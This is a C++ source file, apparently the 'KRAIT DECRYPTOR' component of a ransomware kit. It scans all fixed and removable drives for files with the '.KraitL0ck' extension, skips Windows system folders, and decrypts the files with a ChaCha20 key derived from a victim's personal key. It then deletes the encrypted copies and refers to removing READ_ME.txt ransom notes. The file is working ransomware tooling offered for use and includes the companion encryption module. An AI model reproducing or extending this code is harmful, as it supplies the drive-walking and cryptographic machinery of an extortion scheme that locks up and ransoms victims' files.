#include "../src/encryption.h"
#include "../src/keygen.h"
#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <vector>
#include <thread>
#include <atomic>
#include <set>
#include <algorithm>
#include <string>

namespace fs = std::filesystem;

static std::atomic<bool> stopDecrypt = false;
static std::vector<std::thread> decryptThreads;
static std::atomic<int> filesDecrypted = 0;
static std::atomic<int> totalFiles = 0;

// Расширения для дешифрации
std::vector<std::string> GetTargetExtensions() {
    return { ".KraitL0ck" };
}

// Получить все диски
std::vector<std::string> GetDrives() {
    std::vector<std::string> drives;
    DWORD mask = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (mask & (1 << i)) {
            std::string drive = std::string(1, 'A' + i) + ":\\";
            UINT type = GetDriveTypeA(drive.c_str());
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                drives.push_back(drive);
            }
        }
    }
    return drives;
}

// Пропуск системных папок
bool ShouldSkipPath(const std::string& path) {
    static const std::set<std::string> skipDirs = {
        "\\Windows\\", "\\System32\\", "\\SysWOW64\\",
        "\\Program Files\\", "\\Program Files (x86)\\",
        "\\Windows.old\\", "\\$Recycle.Bin\\",
        "\\System Volume Information\\",
        "\\Boot\\", "\\EFI\\", "\\Recovery\\"
    };
    
    std::string lower = path;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    
    for (const auto& dir : skipDirs) {
        std::string lowerDir = dir;
        std::transform(lowerDir.begin(), lowerDir.end(), lowerDir.begin(), ::tolower);
        if (lower.find(lowerDir) != std::string::npos) {
            return true;
        }
    }
    return false;
}

// Подсчет файлов для дешифрации
void CountFiles(const std::string& dir) {
    if (stopDecrypt) return;
    if (ShouldSkipPath(dir)) return;
    
    try {
        for (const auto& entry : fs::recursive_directory_iterator(dir)) {
            if (stopDecrypt) return;
            if (!entry.is_regular_file()) continue;
            
            std::string path = entry.path().string();
            if (ShouldSkipPath(path)) continue;
            
            std::string ext = fs::path(path).extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            
            auto extensions = GetTargetExtensions();
            for (const auto& targetExt : extensions) {
                std::string lowerTarget = targetExt;
                std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
                if (ext == lowerTarget) {
                    totalFiles++;
                    break;
                }
            }
        }
    } catch (...) {}
}

// Дешифрация одного файла
void DecryptFile(const std::string& filePath, const std::vector<uint8_t>& key) {
    if (stopDecrypt) return;
    
    std::ifstream in(filePath, std::ios::binary);
    if (!in) return;
    
    // Читаем nonce (12 байт)
    std::vector<uint8_t> nonce(12);
    in.read((char*)nonce.data(), 12);
    if (in.gcount() != 12) {
        in.close();
        return;
    }
    
    // Читаем зашифрованные данные
    std::vector<uint8_t> encryptedData((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();
    
    if (encryptedData.empty()) return;
    
    // Дешифруем
    std::vector<uint8_t> decryptedData = Encryption::DecryptData(encryptedData);
    if (decryptedData.empty()) return;
    
    // Восстанавливаем оригинальное имя
    std::string originalPath = filePath;
    size_t pos = originalPath.find_last_of('.');
    if (pos != std::string::npos) {
        originalPath = originalPath.substr(0, pos);
    }
    
    // Записываем расшифрованные данные
    std::ofstream out(originalPath, std::ios::binary);
    if (!out) return;
    out.write((char*)decryptedData.data(), decryptedData.size());
    out.close();
    
    // Удаляем зашифрованный файл
    DeleteFileA(filePath.c_str());
    
    filesDecrypted++;
    
    // Прогресс
    if (totalFiles > 0) {
        int percent = (filesDecrypted * 100) / totalFiles;
        std::cout << "\r[*] Decrypting: " << filesDecrypted << "/" << totalFiles << " (" << percent << "%)" << std::flush;
    } else {
        std::cout << "\r[*] Decrypting: " << filesDecrypted << " files..." << std::flush;
    }
}

// Дешифрация директории
void DecryptDirectory(const std::string& dir, const std::vector<uint8_t>& key, int threadIndex) {
    if (stopDecrypt) return;
    if (ShouldSkipPath(dir)) return;
    
    try {
        std::vector<std::string> files;
        for (const auto& entry : fs::recursive_directory_iterator(dir)) {
            if (stopDecrypt) return;
            if (!entry.is_regular_file()) continue;
            
            std::string path = entry.path().string();
            if (ShouldSkipPath(path)) continue;
            
            std::string ext = fs::path(path).extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            
            auto extensions = GetTargetExtensions();
            for (const auto& targetExt : extensions) {
                std::string lowerTarget = targetExt;
                std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
                if (ext == lowerTarget) {
                    files.push_back(path);
                    break;
                }
            }
        }
        
        for (const auto& file : files) {
            if (stopDecrypt) break;
            DecryptFile(file, key);
        }
    } catch (...) {
        // Молча продолжаем
    }
}

// Дешифрация диска
void DecryptDrive(const std::string& drive, const std::vector<uint8_t>& key, int threadIndex) {
    if (stopDecrypt) return;
    if (ShouldSkipPath(drive)) return;
    
    try {
        for (const auto& entry : fs::directory_iterator(drive)) {
            if (stopDecrypt) return;
            if (entry.is_directory()) {
                DecryptDirectory(entry.path().string(), key, threadIndex);
            }
        }
    } catch (...) {}
}

// Подсчет файлов на всех дисках
void CountAllFiles() {
    auto drives = GetDrives();
    for (const auto& drive : drives) {
        if (stopDecrypt) return;
        CountFiles(drive);
    }
}

// Главная функция дешифрации
void StartDecryption(const std::string& personalKey) {
    std::cout << "\n========================================\n";
    std::cout << "  KRAIT DECRYPTOR v1.0\n";
    std::cout << "========================================\n";
    std::cout << "[*] Initializing decryption...\n";
    
    // Генерируем ключ ChaCha20 из персонального ключа
    auto chachaKey = KeyGen::DeriveChaChaKey(personalKey);
    Encryption::Initialize(chachaKey);
    
    std::cout << "[*] Key initialized successfully.\n";
    std::cout << "[*] Scanning for encrypted files...\n";
    
    // Сначала подсчитываем общее количество файлов
    CountAllFiles();
    std::cout << "[*] Found " << totalFiles << " encrypted files.\n";
    
    if (totalFiles == 0) {
        std::cout << "[!] No encrypted files found.\n";
        return;
    }
    
    std::cout << "[*] Starting decryption...\n\n";
    
    auto drives = GetDrives();
    for (int i = 0; i < drives.size(); i++) {
        decryptThreads.emplace_back([i, drives, chachaKey]() {
            DecryptDrive(drives[i], chachaKey, i);
        });
    }
    
    for (auto& t : decryptThreads) {
        if (t.joinable()) t.join();
    }
    
    std::cout << "\n\n========================================\n";
    std::cout << "[+] Decryption completed successfully!\n";
    std::cout << "[+] Files decrypted: " << filesDecrypted << "\n";
    std::cout << "========================================\n";
}

int main() {
    std::cout << "\n========================================\n";
    std::cout << "  KRAIT DECRYPTOR\n";
    std::cout << "========================================\n";
    std::cout << "\nEnter your personal key: ";
    
    std::string personalKey;
    std::getline(std::cin, personalKey);
    
    // Удаляем пробелы
    personalKey.erase(std::remove_if(personalKey.begin(), personalKey.end(), ::isspace), personalKey.end());
    
    // Проверка формата ключа
    if (personalKey.length() < 16 || personalKey.length() > 23) {
        std::cout << "\n[ERROR] Invalid key format!\n";
        std::cout << "Key should be like: XXXX-XXXX-XXXX-XXXX\n";
        system("pause");
        return 1;
    }
    
    // Запуск дешифрации
    StartDecryption(personalKey);
    
    // Удаляем READ_ME.txt файлы
    std::cout << "\n[*] Cleaning up READ_ME.txt files...\n";
    // (Опционально: удаляем все READ_ME.txt в зашифрованных папках)
    
    std::cout << "\nPress any key to exit...\n";
    system("pause");
    return 0;
}
